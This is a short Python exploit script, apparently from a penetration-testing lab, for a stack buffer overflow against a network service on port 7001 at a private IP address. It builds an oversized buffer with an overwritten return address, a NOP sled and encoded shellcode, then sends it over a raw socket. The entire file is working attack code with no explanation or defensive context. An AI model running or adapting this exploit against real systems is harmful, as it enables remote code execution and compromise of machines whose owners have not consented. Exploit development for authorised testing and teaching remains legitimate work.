#!/usr/bin/python
import socket

print "\nSending evil buffer..."
shellcode = ("\xbf\x99\x94\x16\xe6\xdd\xc0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x0e\x03\xe4\x9a\xf4\x13\xea\x4b\x7a"
"\xdb\x12\x8c\x1b\x55\xf7\xbd\x1b\x01\x7c\xed\xab\x41\xd0\x02"
"\x47\x07\xc0\x91\x25\x80\xe7\x12\x83\xf6\xc6\xa3\xb8\xcb\x49"
"\x20\xc3\x1f\xa9\x19\x0c\x52\xa8\x5e\x71\x9f\xf8\x37\xfd\x32"
"\xec\x3c\x4b\x8f\x87\x0f\x5d\x97\x74\xc7\x5c\xb6\x2b\x53\x07"
"\x18\xca\xb0\x33\x11\xd4\xd5\x7e\xeb\x6f\x2d\xf4\xea\xb9\x7f"
"\xf5\x41\x84\x4f\x04\x9b\xc1\x68\xf7\xee\x3b\x8b\x8a\xe8\xf8"
"\xf1\x50\x7c\x1a\x51\x12\x26\xc6\x63\xf7\xb1\x8d\x68\xbc\xb6"
"\xc9\x6c\x43\x1a\x62\x88\xc8\x9d\xa4\x18\x8a\xb9\x60\x40\x48"
"\xa3\x31\x2c\x3f\xdc\x21\x8f\xe0\x78\x2a\x22\xf4\xf0\x71\x2b"
"\x39\x39\x89\xab\x55\x4a\xfa\x99\xfa\xe0\x94\x91\x73\x2f\x63"
"\xd5\xa9\x97\xfb\x28\x52\xe8\xd2\xee\x06\xb8\x4c\xc6\x26\x53"
"\x8c\xe7\xf2\xf4\xdc\x47\xad\xb4\x8c\x27\x1d\x5d\xc6\xa7\x42"
"\x7d\xe9\x6d\xeb\x14\x10\xe6\xd4\x41\x6d\x31\xbc\x93\x91\xbc"
"\x86\x1d\x77\xd4\xe8\x4b\x20\x41\x90\xd1\xba\xf0\x5d\xcc\xc7"
"\x33\xd5\xe3\x38\xfd\x1e\x89\x2a\x6a\xef\xc4\x10\x3d\xf0\xf2"
"\x3c\xa1\x63\x99\xbc\xac\x9f\x36\xeb\xf9\x6e\x4f\x79\x14\xc8"
"\xf9\x9f\xe5\x8c\xc2\x1b\x32\x6d\xcc\xa2\xb7\xc9\xea\xb4\x01"
"\xd1\xb6\xe0\xdd\x84\x60\x5e\x98\x7e\xc3\x08\x72\x2c\x8d\xdc"
"\x03\x1e\x0e\x9a\x0b\x4b\xf8\x42\xbd\x22\xbd\x7d\x72\xa3\x49"
"\x06\x6e\x53\xb5\xdd\x2a\x73\x54\xf7\x46\x1c\xc1\x92\xea\x41"
"\xf2\x49\x28\x7c\x71\x7b\xd1\x7b\x69\x0e\xd4\xc0\x2d\xe3\xa4"
"\x59\xd8\x03\x1a\x59\xc9")
buffer = "A" * 2288
eip = "\xCF\x10\x80\x14"
offset = (2560 - len(buffer) - len(eip)) * "C"
nops = "\x90" * 10

input_buffer = buffer + eip + offset + nops +  shellcode
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.199.10", 7001))
s.send(input_buffer)

s.close()

print "\nDone!"
